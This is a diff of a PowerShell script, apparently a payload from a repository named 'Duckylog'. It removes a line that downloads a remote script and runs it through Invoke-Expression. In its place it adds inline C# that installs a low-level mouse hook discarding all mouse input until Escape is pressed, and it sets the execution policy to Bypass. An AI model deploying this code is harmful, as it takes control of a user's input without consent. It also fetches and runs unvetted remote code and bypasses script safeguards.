@@ -1,5 +1,57 @@
-$scriptUrl = "https://raw.githubusercontent.com/Mocipie/Duckylog/refs/heads/main/mouseoff.ps1"
-Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
+Add-Type -AssemblyName System.Windows.Forms
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class MouseBlocker
+{
+    private const int WH_MOUSE_LL = 14;
+    private static IntPtr hookID = IntPtr.Zero;
+    private static LowLevelMouseProc proc = HookCallback;
+
+    private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    public static void Start()
+    {
+        IntPtr hModule = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+        hookID = SetWindowsHookEx(WH_MOUSE_LL, proc, hModule, 0);
+    }
+
+    public static void Stop()
+    {
+        UnhookWindowsHookEx(hookID);
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        return (IntPtr)1;
+    }
+}
+"@ -ReferencedAssemblies "System.Windows.Forms"
+
+[MouseBlocker]::Start()
+
+while ($true) {
+    if ([Console]::KeyAvailable) {
+        if ([Console]::ReadKey($true).Key -eq "Escape") {
+            [MouseBlocker]::Stop()
+            break
+        }
+    }
+    Start-Sleep -Milliseconds 100
+}
 
 # Set Execution Policy
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
